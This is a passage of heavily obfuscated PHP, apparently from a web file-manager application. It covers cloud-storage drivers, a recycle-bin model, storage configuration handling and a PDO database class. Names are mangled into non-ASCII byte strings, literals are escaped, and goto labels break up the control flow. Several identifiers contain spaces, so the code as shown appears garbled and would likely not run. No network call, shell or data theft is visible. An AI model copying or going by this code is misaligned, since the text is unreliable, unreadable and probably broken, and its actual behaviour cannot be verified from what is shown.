@chmod($ßøóú®, $this->pathAuth); return $çš‹Ë²› === !1 ? !1 : !0; } public function fileSubstr($˜ŒåÃØÛ, $ğï§İ† = 0, $ƒŞöŠ = false) { $¨ ©ğã =& $_SERVER[•€áå–Õ]; $˜ŒåÃØÛ = $this->iconvSystem($˜ŒåÃØÛ); if ($ƒŞöŠ === !1) { $ƒŞöŠ = $this->size($˜ŒåÃØÛ); } if ($ƒŞöŠ <= 0) { return $¨ ©ğã[22]; } $‹åŒ = fopen($˜ŒåÃØÛ, $¨ ©ğã[1408]); if (!$‹åŒ) { return !1; } fseek_64($‹åŒ, $ğï§İ†); $Ø•í‰Á = fread($‹åŒ, $ƒŞöŠ); fclose($‹åŒ); return $Ø•í‰Á; } public function upload($íù¢İÈà, $¡›¢Ì¾Š, $õúÌµòÄ = false, $½ˆ×ş”í = REPEAT_REPLACE) { if ($õúÌµòÄ) { return $this->moveFile($¡›¢Ì¾Š, $íù¢İÈà); } return $this->copyFile($¡›¢Ì¾Š, $íù¢İÈà); } public function setModifyTime($õş¦Ë•ª, $İ’àÙÆß = '') { @touch($õş¦Ë•ª, intval($İ’àÙÆß)); } public function download($ÛÆ°£À˜, $ôŠˆ¦„û) { return $this->iconvSystem($ÛÆ°£À˜); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($»´Îüœ) { parent::__construct($»´Îüœ); $this->signatureVersion($_SERVER[•€áå–Õ][243]); } public function fileOutImage($¸ÚÓ¯ñ‚, $ôêÚÔ¤ = 250) { $§ŞÚõ³¸ =& $_SERVER[•€áå–Õ]; if ($this->size($¸ÚÓ¯ñ‚) > 1024 * 1024 * 25) { return $this->fileOutImageServer($¸ÚÓ¯ñ‚, $ôêÚÔ¤); } $è¥ìŸ°¾ = array($§ŞÚõ³¸[1409] => $§ŞÚõ³¸[1410] . $ôêÚÔ¤ . $§ŞÚõ³¸[1411]); $ØÊû¼ÁÚ = $this->link($¸ÚÓ¯ñ‚, $è¥ìŸ°¾); $this->fileOutLink($ØÊû¼ÁÚ); } public function fileOutLink($æñ•ô¯) { $ª»Æıôæ =& $_SERVER[•€áå–Õ]; if (substr($æñ•ô¯, 0, 7) == $ª»Æıôæ[1372]) { $æñ•ô¯ = $ª»Æıôæ[1373] . substr($æñ•ô¯, 7); } header($ª»Æıôæ[174] . $æñ•ô¯); die; } } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($ÙÁÊº¨¦) { parent::__construct($ÙÁÊº¨¦); $this->signatureVersion($_SERVER[•€áå–Õ][243]); } public function fileOutLink($İÅç³Š) { $Ÿ¢Ğ´µá =& $_SERVER[•€áå–Õ]; if (substr($İÅç³Š, 0, 7) == $Ÿ¢Ğ´µá[1372]) { $İÅç³Š = $Ÿ¢Ğ´µá[1373] . substr($İÅç³Š, 7); } header($Ÿ¢Ğ´µá[174] . $İÅç³Š); die; } } goto D×»Ï¯ëñÑ; BÛœœÜŞª”: class SourceRecycleModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\165\162\x63\x65\x5f\x72\x65\x63\171\x63\154\x65"; protected $dataAuto = array(array("\143\162\x65\x61\x74\145\124\x69\x6d\x65", "\164\x69\x6d\x65", "\151\x6e\x73\x65\x72\164", "\146\165\156\143\164\151\157\x6e")); public function listData($üÍù€«ƒ = false) { $ùšÚ‘ =& $_SERVER[•€áå–Õ]; $üÍù€«ƒ = $üÍù€«ƒ ? $üÍù€«ƒ : USER_ID; $¨ÁÍåº´ = $this->where(array($ùšÚ‘[1684] => $üÍù€«ƒ))->select(); return array_to_keyvalue($¨ÁÍåº´, $ùšÚ‘[22], $ùšÚ‘[193]); } public function moveToRecycle($¬ğã¬©ß) { $åßˆ€Ç» =& $_SERVER[•€áå–Õ]; $¶©É•ÓŒ = Model($åßˆ€Ç»[1374]); $ÃÀ¶šüÒ = $¶©É•ÓŒ->sourceInfo($¬ğã¬©ß); if (!$ÃÀ¶šüÒ || $ÃÀ¶šüÒ[$åßˆ€Ç»[484]] == $åßˆ€Ç»[100]) { return; } $Úİ–¤¼ = array($åßˆ€Ç»[470] => $¬ğã¬©ß, $åßˆ€Ç»[1684] => USER_ID, $åßˆ€Ç»[627] => $ÃÀ¶šüÒ[$åßˆ€Ç»[190]], $åßˆ€Ç»[628] => $ÃÀ¶šüÒ[$åßˆ€Ç»[549]], $åßˆ€Ç»[631] => $ÃÀ¶šüÒ[$åßˆ€Ç»[564]]); $this->add($Úİ–¤¼); $this->recycleMove($¬ğã¬©ß, 1); if ($ÃÀ¶šüÒ[$åßˆ€Ç»[464]] == $åßˆ€Ç»[100]) { $Ò¸ÄŒé± = array($åßˆ€Ç»[631] => array($åßˆ€Ç»[591], $ÃÀ¶šüÒ[$åßˆ€Ç»[564]] . $¬ğã¬©ß . $åßˆ€Ç»[592])); $¶©É•ÓŒ->where($Ò¸ÄŒé±)->setField($åßˆ€Ç»[484], 1); } } public function clear() { $this->remove(!1); } public function remove($ë‹ó§Ãğ = false, $‘ÉÀ¢— = false) { $¦êÉ½û¦ =& $_SERVER[•€áå–Õ]; $‘ÉÀ¢— = $‘ÉÀ¢— ? $‘ÉÀ¢— : USER_ID; $¾€¶Âí¯ = Model($¦êÉ½û¦[1374]); $ÔÕÇ ¿¤ = $this->listData($‘ÉÀ¢—); $ë‹ó§Ãğ = $ë‹ó§Ãğ === !1 ? !1 : $ë‹ó§Ãğ; $ñÓ’ï  = array(); foreach ($ÔÕÇ ¿¤ as $­Ÿöª²) { if ($ë‹ó§Ãğ != !1 && !in_array($­Ÿöª², $ë‹ó§Ãğ)) { continue; } $ĞĞ°ƒŠ‚ = $¾€¶Âí¯->sourceInfo($­Ÿöª²); $¾€¶Âí¯->remove($­Ÿöª², !1); $¬¼„½ÆÀ = $ĞĞ°ƒŠ‚[$¦êÉ½û¦[190]] . $¦êÉ½û¦[21] . $ĞĞ°ƒŠ‚[$¦êÉ½û¦[549]]; $ñÓ’ï [$¬¼„½ÆÀ] = array($¦êÉ½û¦[627] => $ĞĞ°ƒŠ‚[$¦êÉ½û¦[190]], $¦êÉ½û¦[549] => $ĞĞ°ƒŠ‚[$¦êÉ½û¦[549]]); $this->where(array($¦êÉ½û¦[193] => $­Ÿöª²))->delete(); } foreach ($ñÓ’ï  as $šú·«·Ç) { $¾€¶Âí¯->targetSpaceUpdate($šú·«·Ç[$¦êÉ½û¦[190]], $šú·«·Ç[$¦êÉ½û¦[549]]); } } public function restore($¶—¹öú‰ = false) { $Ü¦…øãÕ = $this->listData(); $this->_restoreSource($Ü¦…øãÕ, $¶—¹öú‰); } public function removeUserAll($ÅÂÃí«) { $this->remove(!1, $ÅÂÃí«); } public function restoreItem($çÃ¸ü¿ú) { $this->_restoreSource(array($çÃ¸ü¿ú), array($çÃ¸ü¿ú)); } private function _restoreSource($İ³«à¸‘, $×Á“ø–­) { $ŠàÄİ°ê =& $_SERVER[•€áå–Õ]; $ĞŸö­Öœ = Model($ŠàÄİ°ê[1374]); $×Á“ø–­ = $×Á“ø–­ == !1 ? !1 : $×Á“ø–­; if (!$İ³«à¸‘) { return !0; } $Ü³÷üˆ´ = array(); foreach ($İ³«à¸‘ as $Öüó±Á¸) { if ($×Á“ø–­ != !1 && !in_array($Öüó±Á¸, $×Á“ø–­)) { continue; } $ë­šÙ£‰ = $ĞŸö­Öœ->sourceInfo($Öüó±Á¸); $ÈÍ·Ò³È = $ĞŸö­Öœ->sourceInfo($ë­šÙ£‰[$ŠàÄİ°ê[192]]); if ($ÈÍ·Ò³È[$ŠàÄİ°ê[484]] == $ŠàÄİ°ê[100]) { continue; } $ĞŸö­Öœ->lockMoveStart($Öüó±Á¸); $this->recycleMove($Öüó±Á¸, 0); if ($ë­šÙ£‰[$ŠàÄİ°ê[464]] == $ŠàÄİ°ê[100]) { $À¥ŠÑÑğ = array($ŠàÄİ°ê[631] => array($ŠàÄİ°ê[591], $ë­šÙ£‰[$ŠàÄİ°ê[564]] . $Öüó±Á¸ . $ŠàÄİ°ê[592])); $ĞŸö­Öœ->where($À¥ŠÑÑğ)->setField($ŠàÄİ°ê[484], 0); $this->restoreFolderChildren($Öüó±Á¸, $İ³«à¸‘); } $this->where(array($ŠàÄİ°ê[193] => $Öüó±Á¸))->delete(); $ĞŸö­Öœ->folderSizeReset($ë­šÙ£‰[$ŠàÄİ°ê[192]]); $Ü³÷üˆ´[] = $ë­šÙ£‰[$ŠàÄİ°ê[192]]; if ($ë­šÙ£‰[$ŠàÄİ°ê[464]] == $ŠàÄİ°ê[100]) { $Ü³÷üˆ´[] = $Öüó±Á¸; } $ĞŸö­Öœ->lockMoveEnd($Öüó±Á¸); } $ĞŸö­Öœ->updateModifyTime($Ü³÷üˆ´); } private function restoreFolderChildren($©õìşøó, $¼úµĞŒ) { $ìÃ¿Öº =& $_SERVER[•€áå–Õ]; $ıĞ¶ŸÓÆ = Model($ìÃ¿Öº[1374]); $î—ßÏó› = array($ìÃ¿Öº[193] => array($ìÃ¿Öº[17], array())); foreach ($¼úµĞŒ as $ÔŒ˜¦¡â) { if ($ÔŒ˜¦¡â == $©õìşøó) { continue; } if (!$ıĞ¶ŸÓÆ->isParentOf($©õìşøó, $ÔŒ˜¦¡â)) { continue; } $§Íûï = $ıĞ¶ŸÓÆ->sourceInfo($ÔŒ˜¦¡â); if ($§Íûï[$ìÃ¿Öº[464]] == $ìÃ¿Öº[100]) { $î—ßÏó›[] = array($ìÃ¿Öº[631] => array($ìÃ¿Öº[591], $§Íûï[$ìÃ¿Öº[564]] . $ÔŒ˜¦¡â . $ìÃ¿Öº[592])); } else { $î—ßÏó›[$ìÃ¿Öº[193]][1][] = $ÔŒ˜¦¡â; } } if (!$î—ßÏó›[$ìÃ¿Öº[193]][1]) { unset($î—ßÏó›[$ìÃ¿Öº[193]]); } if (!$î—ßÏó›) { return; } if (is_array($î—ßÏó›[$ìÃ¿Öº[193]]) && is_array($î—ßÏó›[$ìÃ¿Öº[193]][1])) { $î—ßÏó›[$ìÃ¿Öº[193]][1] = array_unique($î—ßÏó›[$ìÃ¿Öº[193]][1]); } $î—ßÏó›[$ìÃ¿Öº[1041]] = $ìÃ¿Öº[1989]; $ıĞ¶ŸÓÆ->where($î—ßÏó›)->setField($ìÃ¿Öº[484], 1); } private function recycleMove($í®ßÊáÕ, $œ‘­Ù³ = 1) { $“¤‚£—¯ =& $_SERVER[•€áå–Õ]; $Ş¡æÅâ¤ = Model($“¤‚£—¯[1374]); $õÇ»Ì£‚ = Model($“¤‚£—¯[2209]); $•‡æÇş• = array($“¤‚£—¯[193] => $í®ßÊáÕ); if ($œ‘­Ù³) { $Ş¡æÅâ¤->where($•‡æÇş•)->setField($“¤‚£—¯[484], 1); $õÇ»Ì£‚->eventRecycle($í®ßÊáÕ, $“¤‚£—¯[2210]); } else { $³ï“ƒ¤È = $Ş¡æÅâ¤->where($•‡æÇş•)->find(); $†¬¥Ä¹Ï = $³ï“ƒ¤È[$“¤‚£—¯[464]] == $“¤‚£—¯[100]; $ƒë­©€ç = $Ş¡æÅâ¤->fileNameAuto($³ï“ƒ¤È[$“¤‚£—¯[192]], $³ï“ƒ¤È[$“¤‚£—¯[42]], REPEAT_RENAME_FOLDER, $†¬¥Ä¹Ï); if ($ƒë­©€ç != $³ï“ƒ¤È[$“¤‚£—¯[42]]) { $Ş¡æÅâ¤->rename($í®ßÊáÕ, $ƒë­©€ç); } $Ş¡æÅâ¤->where($•‡æÇş•)->setField($“¤‚£—¯[484], 0); $õÇ»Ì£‚->eventRecycle($í®ßÊáÕ, $“¤‚£—¯[2211]); } } } class SourceSecretModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\x65\x6d\x2e\163\x6f\165\162\x63\145\123\145\x63\162\x65\x74\x4c\151\x73\164"; public $field = array("\163\157\165\162\x63\145\x49\104", "\164\x79\160\x65\111\104", "\143\162\x65\x61\x74\x65\x55\x73\145\162"); } class StorageModel extends ModelBaseLight { public $optionType = "\123\171\x73\x74\145\155\56\163\164\157\162\x61\147\145\x4c\x69\163\x74"; public $field = array("\156\x61\x6d\145", "\163\x69\x7a\145\115\x61\170", "\x73\x79\163\x74\145\155", "\x64\145\x66\141\x75\x6c\x74", "\x64\162\151\166\x65\162", "\143\x6f\x6e\x66\151\147"); public function listData($éÓÉÌï = false, $Öª®  = "\x6d\157\144\x69\x66\x79\124\x69\x6d\145", $üÕí”È = false) { $–ïÊ“ÅŒ =& $_SERVER[•€áå–Õ]; $Ğ¿ÛÇ¹ = parent::listData($éÓÉÌï, $Öª® , $üÕí”È); if ($éÓÉÌï) { return $Ğ¿ÛÇ¹; } $ÏÜæºŠ = $this->ioSizeUseGet(array_to_keyvalue($Ğ¿ÛÇ¹, $–ïÊ“ÅŒ[22], $–ïÊ“ÅŒ[454])); foreach ($Ğ¿ÛÇ¹ as $§í‡Ÿçï => $şÃÍ—º) { unset($Ğ¿ÛÇ¹[$§í‡Ÿçï][$–ïÊ“ÅŒ[16]]); $Ğ¿ÛÇ¹[$§í‡Ÿçï][$–ïÊ“ÅŒ[1880]] = isset($ÏÜæºŠ[$şÃÍ—º[$–ïÊ“ÅŒ[454]]]) ? $ÏÜæºŠ[$şÃÍ—º[$–ïÊ“ÅŒ[454]]] : 0; } return $Ğ¿ÛÇ¹; } public function ioSizeUseGet($¥†ì»¡¬) { $ÂÓöô«ö =& $_SERVER[•€áå–Õ]; if (!$¥†ì»¡¬) { return array(); } $Ó¦–ÍÈ› = $ÂÓöô«ö[2212] . implode($ÂÓöô«ö[60], $¥†ì»¡¬); $„¤âˆÁ± = Cache::get($Ó¦–ÍÈ›); if ($„¤âˆÁ±) { return $„¤âˆÁ±; } $òƒíáû = array($ÂÓöô«ö[858] => $ÂÓöô«ö[454], $ÂÓöô«ö[2213] => $ÂÓöô«ö[88]); $åØ³öÍš = array($ÂÓöô«ö[858] => array($ÂÓöô«ö[17], $¥†ì»¡¬)); $„¤âˆÁ± = Model($ÂÓöô«ö[830])->field($òƒíáû)->where($åØ³öÍš)->group($ÂÓöô«ö[858])->select(); $„¤âˆÁ± = array_to_keyvalue($„¤âˆÁ±, $ÂÓöô«ö[454], $ÂÓöô«ö[88]); Cache::set($Ó¦–ÍÈ›, $„¤âˆÁ±, 600); return $„¤âˆÁ±; } public function getConfig($ ìæ×†) { $úÑ±ßè› = parent::listData($ ìæ×†); return json_decode($úÑ±ßè›[$_SERVER[•€áå–Õ][16]], !0); } public function update($±ÑÒ˜ññ, $ú¦á«£à) { $±×¼‹®å =& $_SERVER[•€áå–Õ]; $¤Õ»ŒÊ¿ = $ú¦á«£à[$±×¼‹®å[42]]; $óËš‡æ‡ = array_to_keyvalue(parent::listData(), $±×¼‹®å[42]); if (isset($óËš‡æ‡[$¤Õ»ŒÊ¿]) && $óËš‡æ‡[$¤Õ»ŒÊ¿][$±×¼‹®å[454]] != $±ÑÒ˜ññ) { return !1; } $this->checkPwd($±ÑÒ˜ññ, $ú¦á«£à); if (isset($ú¦á«£à[$±×¼‹®å[2214]]) && $ú¦á«£à[$±×¼‹®å[2214]] == $±×¼‹®å[100]) { $this->checkConfig($ú¦á«£à); } unset($ú¦á«£à[$±×¼‹®å[2214]]); $Ë™€»ÎÔ = parent::update($±ÑÒ˜ññ, $ú¦á«£à); if ($Ë™€»ÎÔ && $ú¦á«£à[$±×¼‹®å[47]]) { $’€ˆ£ÓŠ = 0; foreach ($óËš‡æ‡ as $üş–©˜ş) { if ($üş–©˜ş[$±×¼‹®å[47]] && $üş–©˜ş[$±×¼‹®å[454]] != $±ÑÒ˜ññ) { $’€ˆ£ÓŠ = $üş–©˜ş[$±×¼‹®å[454]]; parent::update($üş–©˜ş[$±×¼‹®å[454]], array($±×¼‹®å[47] => 0)); } } $this->updateBackup($±ÑÒ˜ññ, $’€ˆ£ÓŠ); } return $Ë™€»ÎÔ; } public function add($ç›ë‚Ü›) { $…„¶¿æÁ =& $_SERVER[•€áå–Õ]; $¢Úü³œ = array_to_keyvalue(parent::listData(), $…„¶¿æÁ[42]); if (isset($¢Úü³œ[$ç›ë‚Ü›[$…„¶¿æÁ[42]]])) { return !1; } $this->checkConfig($ç›ë‚Ü›); $à’˜ƒâ¯ = parent::insert($ç›ë‚Ü›); if ($à’˜ƒâ¯ && $ç›ë‚Ü›[$…„¶¿æÁ[47]]) { foreach ($¢Úü³œ as $àÄÔÅÕú) { if ($àÄÔÅÕú[$…„¶¿æÁ[47]]) { parent::update($àÄÔÅÕú[$…„¶¿æÁ[454]], array($…„¶¿æÁ[47] => 0)); } } } return $à’˜ƒâ¯; } public function updateBackup($…Úø”¦•, $ÖÈìË·) { $ö‚é…„© =& $_SERVER[•€áå–Õ]; if (!$ÖÈìË·) { return; } $Ê÷¨¶•™ = Model($ö‚é…„©[790])->config(); if ($Ê÷¨¶•™[$ö‚é…„©[1663]] != $ö‚é…„©[100] || $Ê÷¨¶•™[$ö‚é…„©[792]] != $ÖÈìË·) { return; } $æİ°²¥õ = Model($ö‚é…„©[811])->get($ö‚é…„©[821]); $æİ°²¥õ = json_decode($æİ°²¥õ, !0); if (!$æİ°²¥õ) { return; } $æİ°²¥õ[$ö‚é…„©[792]] = $…Úø”¦•; Model($ö‚é…„©[811])->set(array($ö‚é…„©[821] => $æİ°²¥õ)); } public function checkPwd($ÜïòìÏ, &$«ø¦”‡³) { $¡¾ÍÛ³ß =& $_SERVER[•€áå–Õ]; if (empty($«ø¦”‡³[$¡¾ÍÛ³ß[16]])) { return; } $ñäâÌÍâ = json_decode($«ø¦”‡³[$¡¾ÍÛ³ß[16]], !0); $Ì×†©Ù‡ = $¡¾ÍÛ³ß[22]; $ßüíÏ = array($¡¾ÍÛ³ß[2215], $¡¾ÍÛ³ß[2216], $¡¾ÍÛ³ß[930]); foreach ($ßüíÏ as $’ Ì“åˆ) { if (isset($ñäâÌÍâ[$’ Ì“åˆ])) { $Ì×†©Ù‡ = $’ Ì“åˆ; break; } } if (!$Ì×†©Ù‡) { return; } $ÅËí˜ú = $this->getConfig($ÜïòìÏ); $Âî³á¾ı = $ÅËí˜ú[$Ì×†©Ù‡]; $Ãä¨”ŸÈ = $ñäâÌÍâ[$Ì×†©Ù‡]; if ($Ãä¨”ŸÈ == str_repeat($¡¾ÍÛ³ß[215], strlen($Âî³á¾ı))) { $ñäâÌÍâ[$Ì×†©Ù‡] = $Âî³á¾ı; $«ø¦”‡³[$¡¾ÍÛ³ß[16]] = json_encode($ñäâÌÍâ); } else { if ($Ãä¨”ŸÈ != $Âî³á¾ı) { $«ø¦”‡³[$¡¾ÍÛ³ß[2214]] = $¡¾ÍÛ³ß[100]; } } } public function checkConfig(&$ò®³±§, $©êÆÏ‹“ = false) { $»Ë„şÎõ =& $_SERVER[•€áå–Õ]; $Óæº—˜à = strtolower($ò®³±§[$»Ë„şÎõ[107]]); $ˆÀ¬±Â‘ = json_decode($ò®³±§[$»Ë„şÎõ[16]], !0); foreach ($ˆÀ¬±Â‘ as $Æ’®Ø => $ÑâƒĞ) { if (is_string($ÑâƒĞ)) { $ˆÀ¬±Â‘[$Æ’®Ø] = trim($ÑâƒĞ); } } $ˆÀ¬±Â‘[$»Ë„şÎõ[2217]] = rand_string(6); $Úø¿ûÉª = $GLOBALS[$»Ë„şÎõ[16]][$»Ë„şÎõ[101]][$»Ë„şÎõ[867]]; $ûøê÷ëó = isset($Úø¿ûÉª[$Óæº—˜à]) ? $Úø¿ûÉª[$Óæº—˜à] : ucfirst($Óæº—˜à); $Æ™ÀÇ¼¿ = $»Ë„şÎõ[86] . $ûøê÷ëó; if (!$ûøê÷ëó || !class_exists($Æ™ÀÇ¼¿)) { if ($©êÆÏ‹“) { return LNG($»Ë„şÎõ[2218]); } write_log(array($»Ë„şÎõ[2219], $ò®³±§, get_caller_info()), $»Ë„şÎõ[2220]); show_json(LNG($»Ë„şÎõ[2218]), !1, $ò®³±§); } $ÔíŠ = new $Æ™ÀÇ¼¿($ˆÀ¬±Â‘); if (in_array($Óæº—˜à, $ÔíŠ->objectDriver)) { if (!$ÔíŠ->isBucketCors() && !$ÔíŠ->setBucketCors()) { $­º¬éù = LNG($»Ë„şÎõ[2221]); $­º¬éù .= $»Ë„şÎõ[2222] . LNG($»Ë„şÎõ[2223]); if ($©êÆÏ‹“) { return $­º¬éù; } show_json($­º¬éù, !1); } } $ï“˜Âö  = rtrim($ˆÀ¬±Â‘[$»Ë„şÎõ[1221]], $»Ë„şÎõ[18]) . $»Ë„şÎõ[18]; $´–Îºî° = $ÔíŠ->getPath($ï“˜Âö  . $»Ë„şÎõ[1225]); if (!$ÔíŠ->mkfile($´–Îºî°)) { if ($©êÆÏ‹“) { return LNG($»Ë„şÎõ[2221]); } show_json(LNG($»Ë„şÎõ[2221]), !1); } $ˆÀ¬±Â‘[$»Ë„şÎõ[1221]] = $ï“˜Âö ; $ò®³±§[$»Ë„şÎõ[16]] = json_encode($ˆÀ¬±Â‘); $ò®³±§[$»Ë„şÎõ[107]] = $ûøê÷ëó; return !0; } public function driverListSystem() { $ş«­Ëñæ =& $_SERVER[•€áå–Õ]; $úÂÄİ„¨ = parent::listData(); $’ƒ¢ÚŞ´ = array(); foreach ($úÂÄİ„¨ as $Ææ¾®éß) { unset($Ææ¾®éß[$ş«­Ëñæ[227]], $Ææ¾®éß[$ş«­Ëñæ[97]]); $Ææ¾®éß[$ş«­Ëñæ[16]] = json_decode($Ææ¾®éß[$ş«­Ëñæ[16]], !0); $’ƒ¢ÚŞ´[] = $Ææ¾®éß; } return $’ƒ¢ÚŞ´; } public function defaultDriver() { $û‚¬’¢ø =& $_SERVER[•€áå–Õ]; $‡­øœÂÔ = parent::listData(); $áí¾÷ØÈ = array_filter_by_field($‡­øœÂÔ, $û‚¬’¢ø[47], 1); $áí¾÷ØÈ = $áí¾÷ØÈ[0]; if ($áí¾÷ØÈ) { $áí¾÷ØÈ[$û‚¬’¢ø[16]] = json_decode($áí¾÷ØÈ[$û‚¬’¢ø[16]], !0); } return $áí¾÷ØÈ; } public function driverInfo($¤Ê…Î•è) { $œ“†ß‰° =& $_SERVER[•€áå–Õ]; $¨©¢©î´ = array_to_keyvalue(parent::listData(), $œ“†ß‰°[454]); if (!isset($¨©¢©î´[$¤Ê…Î•è])) { return !1; } $˜êÓË´ó = $¨©¢©î´[$¤Ê…Î•è]; $˜êÓË´ó[$œ“†ß‰°[16]] = json_decode($˜êÓË´ó[$œ“†ß‰°[16]], !0); return $˜êÓË´ó; } public function remove($¦È±öô) { $this->removeShareItems($¦È±öô); return parent::remove($¦È±öô); } public function removeWithFile($Õôìåˆ’, $ØÃ³ÃáÂ) { $ä˜‰ˆÍ¢ =& $_SERVER[•€áå–Õ]; $üèÉÅº’ = array($ä˜‰ˆÍ¢[858] => $Õôìåˆ’); $‹„¢¶İœ = Model($ä˜‰ˆÍ¢[523])->where($üèÉÅº’)->count(); $éï³”‹° = Model($ä˜‰ˆÍ¢[523])->where($üèÉÅº’)->sum($ä˜‰ˆÍ¢[88]); $½ŠÓÎ„è = $ØÃ³ÃáÂ . $ä˜‰ˆÍ¢[2224] . $Õôìåˆ’; $Œê°Å… = LNG($ØÃ³ÃáÂ == $ä˜‰ˆÍ¢[599] ? $ä˜‰ˆÍ¢[2225] : $ä˜‰ˆÍ¢[2226]); $Ù”³µïı = new TaskFileTransfer($½ŠÓÎ„è, $ä˜‰ˆÍ¢[2220], $‹„¢¶İœ, $Œê°Å… . "\50{$Õôìåˆ’}\51"); $Ù”³µïı->task[$ä˜‰ˆÍ¢[804]] = (double) $éï³”‹°; $ŠÛÖ€ôõ = KodIO::defaultDriver(); $·Ùª¶®¥ = $ŠÛÖ€ôõ[$ä˜‰ˆÍ¢[454]]; $—óûİ¥° = "\173\x69\x6f\x3a{$·Ùª¶®¥}\x7d\x2f"; $©Ô“Ù‚• = !0; $Ù¥Ñê‹ = array(); $ŒÉ¥©÷½ = Model($ä˜‰ˆÍ¢[226])->where($üèÉÅº’)->field($ä˜‰ˆÍ¢[2227])->select(); foreach ($ŒÉ¥©÷½ as $İ£µûÎ) { $ÏıµÏ  = $İ£µûÎ[$ä˜‰ˆÍ¢[96]]; $Ş¯§êÑ = $—óûİ¥° . str_replace("\173\151\157\x3a{$Õôìåˆ’}\x7d\57", $ä˜‰ˆÍ¢[22], $ÏıµÏ ); if (!IO::exist($ÏıµÏ )) { $Ù¥Ñê‹[] = $İ£µûÎ[$ä˜‰ˆÍ¢[520]]; $Ù”³µïı->updateFileEnd($İ£µûÎ[$ä˜‰ˆÍ¢[42]], $İ£µûÎ[$ä˜‰ˆÍ¢[88]]); continue; } if (IO::exist($Ş¯§êÑ)) { $Ù”³µïı->updateFileEnd($İ£µûÎ[$ä˜‰ˆÍ¢[42]], $İ£µûÎ[$ä˜‰ˆÍ¢[88]]); continue; } if (!IO::move($ÏıµÏ , get_path_father($Ş¯§êÑ))) { $©Ô“Ù‚• = !1; break; } $üèÉÅº’ = array($ä˜‰ˆÍ¢[520] => $İ£µûÎ[$ä˜‰ˆÍ¢[520]]); $Â°„ÜÎ¹ = array($ä˜‰ˆÍ¢[858] => $·Ùª¶®¥, $ä˜‰ˆÍ¢[96] => $Ş¯§êÑ); Model($ä˜‰ˆÍ¢[226])->where($üèÉÅº’)->save($Â°„ÜÎ¹); } $this->removeByFileID($Ù¥Ñê‹); if (!$©Ô“Ù‚•) { $Ù”³µïı->stop($½ŠÓÎ„è); return !1; } $Ù”³µïı->end(); if ($ØÃ³ÃáÂ == $ä˜‰ˆÍ¢[1860]) { $this->remove($Õôìåˆ’); } } public function progress($ŒïÓç÷Ê, $óœ“¬Š) { return Task::get($óœ“¬Š . $_SERVER[•€áå–Õ][2224] . $ŒïÓç÷Ê); } private function removeByFileID($åÈè²²± = array()) { $ÉÃÅ¿Ñ =& $_SERVER[•€áå–Õ]; if (empty($åÈè²²±)) { return; } $ºì±´ˆï = array($ÉÃÅ¿Ñ[520] => array($ÉÃÅ¿Ñ[17], $åÈè²²±)); $şÏÓÂ©ë = Model($ÉÃÅ¿Ñ[1374])->where($ºì±´ˆï)->field($ÉÃÅ¿Ñ[193])->select(); if (!$şÏÓÂ©ë) { return; } $şÏÓÂ©ë = array_to_keyvalue($şÏÓÂ©ë, $ÉÃÅ¿Ñ[22], $ÉÃÅ¿Ñ[193]); foreach ($şÏÓÂ©ë as $’‚ŞìÅÛ) { Model($ÉÃÅ¿Ñ[469])->removeNow($’‚ŞìÅÛ, !1); } } private function removeShareItems($ÎÚ°²ÊÙ) { $»áåù =& $_SERVER[•€áå–Õ]; $ĞÖÚ—û = "\x7b\x69\x6f\72{$ÎÚ°²ÊÙ}\x7d\57"; $İŠ³ªÌá = array($»áåù[193] => 0, $»áåù[1216] => array($»áåù[438], "{$ĞÖÚ—û}\45")); $›ø™•Üã = Model($»áåù[1871])->where($İŠ³ªÌá)->field($»áåù[644])->select(); if (empty($›ø™•Üã)) { return; } $ÁÍ´ñø¦ = array_to_keyvalue($›ø™•Üã, $»áåù[22], $»áåù[644]); Model($»áåù[643])->remove($ÁÍ´ñø¦); } } goto cÌö¹°‰ÆĞ; AÁ™²¢¹Œù: define($_SERVER[•€áå–Õ][296], 1); define($_SERVER[•€áå–Õ][297], 0); define($_SERVER[•€áå–Õ][298], 2); goto b±«ºù÷Íá; DöÙö¯Æ: class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($µÊÒ•™ß = '') { $¦¿Ñ¡ˆÙ =& $_SERVER[•€áå–Õ]; if (!class_exists($¦¿Ñ¡ˆÙ[955])) { think_exception(think_lang($¦¿Ñ¡ˆÙ[24]) . $¦¿Ñ¡ˆÙ[956]); } if (!empty($µÊÒ•™ß)) { $this->config = $µÊÒ•™ß; if (empty($this->config[$¦¿Ñ¡ˆÙ[27]])) { $this->config[$¦¿Ñ¡ˆÙ[27]] = array(); } } } public function connect($™ê¹‰­š = '', $øÈÍí” = 0) { $¿éß‹ÂŸ =& $_SERVER[•€áå–Õ]; if (!isset($this->linkID[$øÈÍí”])) { if (empty($™ê¹‰­š)) { $™ê¹‰­š = $this->config; } $Œ˜Ò°˜ = !empty($™ê¹‰­š[$¿éß‹ÂŸ[27]][$¿éß‹ÂŸ[28]]) ? $™ê¹‰­š[$¿éß‹ÂŸ[27]][$¿éß‹ÂŸ[28]] : $this->pconnect; if ($Œ˜Ò°˜) { $™ê¹‰­š[$¿éß‹ÂŸ[27]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$øÈÍí”] = new PDO($™ê¹‰­š[$¿éß‹ÂŸ[957]], $™ê¹‰­š[$¿éß‹ÂŸ[929]], $™ê¹‰­š[$¿éß‹ÂŸ[930]], $™ê¹‰­š[$¿éß‹ÂŸ[27]]); } catch (PDOException $šêÜ ´Ğ) { think_exception($šêÜ ´Ğ->getMessage()); } $this->dbType = $this->_getDsnType($™ê¹‰­š[$¿éß‹ÂŸ[957]]); if (in_array($this->dbType, array($¿éß‹ÂŸ[958], $¿éß‹ÂŸ[959], $¿éß‹ÂŸ[960], $¿éß‹ÂŸ[961]))) { think_exception($¿éß‹ÂŸ[962] . $this->dbType . $¿éß‹ÂŸ[963] . $this->dbType . $¿éß‹ÂŸ[964]); } if (!$this->linkID[$øÈÍí”]) { think_exception($¿éß‹ÂŸ[965]); } try { $this->linkID[$øÈÍí”]->exec($¿éß‹ÂŸ[966] . think_config($¿éß‹ÂŸ[932])); } catch (Exception $šêÜ ´Ğ) { } $this->connected = !0; if (1 != think_config($¿éß‹ÂŸ[32])) { unset($this->config); } } return $this->linkID[$øÈÍí”]; } public function free() { $this->PDOStatement = null; } public function query($ƒ’¡é¤Ù, $Ø›¸¼ğÃ = array()) { $¥¯¡®ŞŞ =& $_SERVER[•€áå–Õ]; $this->initConnect(!1); if (!$this->_linkID) { return 